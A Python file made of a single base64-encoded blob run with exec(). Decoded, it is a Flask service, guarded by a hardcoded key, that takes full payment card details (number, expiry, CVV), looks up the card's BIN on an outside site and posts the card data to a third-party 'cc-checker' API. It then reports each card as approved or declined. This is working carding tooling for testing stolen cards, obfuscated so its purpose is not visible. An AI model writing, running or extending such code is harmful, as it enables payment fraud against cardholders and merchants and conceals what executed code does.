import base64
exec(base64.b64decode('ZnJvbSBmbGFzayBpbXBvcnQgRmxhc2ssIHJlcXVlc3QsIGpzb25pZnkNCmltcG9ydCByZXF1ZXN0cw0KZnJvbSBkYXRldGltZSBpbXBvcnQgZGF0ZXRpbWUNCg0KYXBwID0gRmxhc2soX19uYW1lX18pDQoNCiMgRGVmaW5lIGEgc2VjcmV0IGtleSBmb3IgdmFsaWRhdGlvbg0KU0VDUkVUX0tFWSA9ICJkYXJrMzM2Ig0KDQojIFNldCB1cCB0aGUgc2Vzc2lvbiBhbmQgaGVhZGVycw0Kc2Vzc2lvbiA9IHJlcXVlc3RzLlNlc3Npb24oKQ0KaGVhZGVycyA9IHsNCiAgICAnYWNjZXB0JzogJyovKicsDQogICAgJ2FjY2VwdC1sYW5ndWFnZSc6ICdlbi1VUyxlbjtxPTAuOSxwdDtxPTAuOCcsDQogICAgJ2NvbnRlbnQtdHlwZSc6ICdhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQ7IGNoYXJzZXQ9VVRGLTgnLA0KICAgICdvcmlnaW4nOiAnaHR0cHM6Ly91bmNvZGVyLmV1Lm9yZycsDQogICAgJ3ByaW9yaXR5JzogJ3U9MSwgaScsDQogICAgJ3JlZmVyZXInOiAnaHR0cHM6Ly91bmNvZGVyLmV1Lm9yZy9jYy1jaGVja2VyLycsDQogICAgJ3NlYy1jaC11YSc6ICciQ2hyb21pdW0iO3Y9IjEzNCIsICJOb3Q6QS1CcmFuZCI7dj0iMjQiLCAiR29vZ2xlIENocm9tZSI7dj0iMTM0IicsDQogICAgJ3NlYy1jaC11YS1tb2JpbGUnOiAnPzAnLA0KICAgICdzZWMtY2gtdWEtcGxhdGZvcm0nOiAnIldpbmRvd3MiJywNCiAgICAnc2VjLWZldGNoLWRlc3QnOiAnZW1wdHknLA0KICAgICdzZWMtZmV0Y2gtbW9kZSc6ICdjb3JzJywNCiAgICAnc2VjLWZldGNoLXNpdGUnOiAnc2FtZS1vcmlnaW4nLA0KICAgICd1c2VyLWFnZW50JzogJ01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzQuMC4wLjAgU2FmYXJpLzUzNy4zNicsDQogICAgJ3gtcmVxdWVzdGVkLXdpdGgnOiAnWE1MSHR0cFJlcXVlc3QnLA0KfQ0KDQpkZWYgZ2V0X2Jpbl9kZXRhaWxzKGJpbl9udW1iZXIpOg0KICAgIHVybCA9IGYiaHR0cHM6Ly9iaW5zLmFudGlwdWJsaWMuY2MvYmlucy97YmluX251bWJlcn0iDQogICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5nZXQodXJsKQ0KICAgIGlmIHJlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwMDoNCiAgICAgICAgcmV0dXJuIHJlc3BvbnNlLmpzb24oKQ0KICAgIHJldHVybiBOb25lDQoNCmRlZiBmb3JtYXRfcmVzcG9uc2UoY2NfZGV0YWlscywgYXBpX3Jlc3BvbnNlLCBiaW5fZGV0YWlscywgdGltZV90YWtlbiwgbWVudGlvbik6DQogICAgY2FyZF9pbmZvID0gY2NfZGV0YWlscy5zcGxpdCgnfCcpDQogICAgY2FyZF9udW1iZXIgPSBjYXJkX2luZm9bMF0NCiAgICBleHBpcnlfbW9udGggPSBjYXJkX2luZm9bMV0NCiAgICBleHBpcnlfeWVhciA9IGNhcmRfaW5mb1syXQ0KICAgIGN2diA9IGNhcmRfaW5mb1szXQ0KDQogICAgaW5mbyA9IGYie2NhcmRfbnVtYmVyfXx7ZXhwaXJ5X21vbnRofXx7ZXhwaXJ5X3llYXJ9fHtjdnZ9Ig0KICAgIGlzc3VlciA9IGJpbl9kZXRhaWxzLmdldCgnYmFuaycsICdVbmtub3duJykgaWYgYmluX2RldGFpbHMgZWxzZSAnVW5rbm93bicNCiAgICBjb3VudHJ5ID0gYmluX2RldGFpbHMuZ2V0KCdjb3VudHJ5X25hbWUnLCAnVW5rbm93bicpIGlmIGJpbl9kZXRhaWxzIGVsc2UgJ1Vua25vd24nDQogICAgZmxhZyA9IGJpbl9kZXRhaWxzLmdldCgnY291bnRyeV9mbGFnJywgJycpIGlmIGJpbl9kZXRhaWxzIGVsc2UgJycNCg0KICAgIGlmIGFwaV9yZXNwb25zZS5nZXQoJ2Vycm9yJykgPT0gMSBhbmQgIkxpdmUiIGluIGFwaV9yZXNwb25zZS5nZXQoJ21zZycsICcnKToNCiAgICAgICAgc3RhdHVzID0gIvCdkIDwnZCp8J2QqfCdkKvwnZCo8J2Qr/CdkJ7wnZCdIOKchSINCiAgICAgICAgcmVzcG9uc2VfbXNnID0gIuKkv09yZGVyIFBsYWNlZCDwn5Sl4qS+Ig0KICAgIGVsaWYgImRpZSIgaW4gYXBpX3Jlc3BvbnNlLmdldCgnbXNnJywgJycpLmxvd2VyKCkgb3IgImRlYWQiIGluIGFwaV9yZXNwb25zZS5nZXQoJ21zZycsICcnKS5sb3dlcigpOg0KICAgICAgICBzdGF0dXMgPSAi8J2Qg/CdkJ7wnZCc8J2QpfCdkKLwnZCn8J2QnvCdkJ0g4p2MIg0KICAgICAgICByZXNwb25zZV9tc2cgPSAi4qS/WW91ciBDYXJkIHdhcyBEZWNsaW5lZOKkviINCiAgICBlbHNlOg0KICAgICAgICBzdGF0dXMgPSAi8J2QovCdkKfwnZCv8J2QmvCdkKXwnZCi8J2QnSDinYwiDQogICAgICAgIHJlc3BvbnNlX21zZyA9IGYi4qS/e2FwaV9yZXNwb25zZS5nZXQoJ21zZycsICdDYXJkIG51bWJlciBpbmNvcnJlY3Qgb3IgZXhwaXJlZCBjYXJkIG9yIENWViBpbmNvcnJlY3Qgb3IgbW9yZScpfeKkviINCg0KICAgIHJlc3BvbnNlID0gZiIiIg0K4pSP4pSB4pSB4pSB4pSB4pSB4pSB4pSB4o2fDQrilIMge3N0YXR1c30NCuKUl+KUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKKmw0K4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSBDQrinqQg8J2XlvCdl67wnZe/8J2XsSAtIHtpbmZvfQ0K4p6kIPCdkIbwnZCa8J2QrfCdkJ7wnZCw8J2QmvCdkLIgLSBTaXRlIEJhc2VkIDAuNSQNCuKepCDwnZel8J2XsvCdmIDwnZe98J2XvPCdl7vwnZiA8J2XsiAtIHtyZXNwb25zZV9tc2d9DQrilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIENCuKWuiDwnZec8J2Xu/Cdl7PwnZe8OiB7aW5mb30NCuKWuiDwnZCI8J2QrPCdkKzwnZCu8J2QnvCdkKs6IHtpc3N1ZXJ9DQrilrog8J2QgvCdkKjwnZCu8J2Qp/CdkK3wnZCr8J2Qsjoge2NvdW50cnl9e2ZsYWd9DQrilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIENCuKepfCdl6fwnZe28J2XuvCdl7IgLSB7dGltZV90YWtlbn0NCuKepfCdl5bwnZe18J2XsvCdl7DwnZe48J2XsvCdl7Eg8J2XlfCdmIYgLSB7bWVudGlvbn0NCuKepfCdkIHwnZCo8J2QrSDwnZCB8J2QsiDinpwg8J2Rq/CdkoLwnZKT8J2SjPCdkoPwnZKQ8J2SmiDwnZG/IOKBtw0KIiIiDQogICAgcmV0dXJuIHJlc3BvbnNlDQoNCkBhcHAucm91dGUoJy9rZXk9PGtleT4vY2M9PGNjX2RldGFpbHM+JykNCmRlZiBjaGVja19jYyhrZXksIGNjX2RldGFpbHMpOg0KICAgIHN0YXJ0X3RpbWUgPSBkYXRldGltZS5ub3coKQ0KDQogICAgIyBWYWxpZGF0ZSB0aGUga2V5DQogICAgaWYga2V5ICE9IFNFQ1JFVF9LRVk6DQogICAgICAgIHJldHVybiBqc29uaWZ5KHsiZXJyb3IiOiAiSW52YWxpZCBrZXkifSksIDQwMw0KDQogICAgIyBFeHRyYWN0IEJJTiBmcm9tIENDIGRldGFpbHMNCiAgICBiaW5fbnVtYmVyID0gY2NfZGV0YWlsc1s6Nl0NCg0KICAgICMgR2V0IEJJTiBkZXRhaWxzDQogICAgYmluX2RldGFpbHMgPSBnZXRfYmluX2RldGFpbHMoYmluX251bWJlcikNCg0KICAgICMgUHJlcGFyZSB0aGUgZGF0YSBwYXlsb2FkDQogICAgZGF0YSA9IHsNCiAgICAgICAgJ2RhdGEnOiBjY19kZXRhaWxzLA0KICAgIH0NCg0KICAgICMgU2VuZCB0aGUgUE9TVCByZXF1ZXN0IHRvIHRoZSBBUEkNCiAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vdW5jb2Rlci5ldS5vcmcvY2MtY2hlY2tlci9hcGkucGhwJywgaGVhZGVycz1oZWFkZXJzLCBkYXRhPWRhdGEpDQogICAgYXBpX3Jlc3BvbnNlID0gcmVzcG9uc2UuanNvbigpDQoNCiAgICAjIENhbGN1bGF0ZSB0aW1lIHRha2VuDQogICAgdGltZV90YWtlbiA9IChkYXRldGltZS5ub3coKSAtIHN0YXJ0X3RpbWUpLnRvdGFsX3NlY29uZHMoKQ0KDQogICAgIyBGb3JtYXQgdGhlIHJlc3BvbnNlDQogICAgbWVudGlvbiA9ICJVc2VyIiAgIyBSZXBsYWNlIHdpdGggYWN0dWFsIHVzZXIgbWVudGlvbiBpZiBhdmFpbGFibGUNCiAgICBmb3JtYXR0ZWRfcmVzcG9uc2UgPSBmb3JtYXRfcmVzcG9uc2UoY2NfZGV0YWlscywgYXBpX3Jlc3BvbnNlLCBiaW5fZGV0YWlscywgZiJ7dGltZV90YWtlbjouMmZ9IHNlY29uZHMiLCBtZW50aW9uKQ0KDQogICAgcmV0dXJuIGZvcm1hdHRlZF9yZXNwb25zZQ0KDQppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOg0KICAgIGFwcC5ydW4oaG9zdD0nMC4wLjAuMCcsIHBvcnQ9NTAwMCk=').decode())
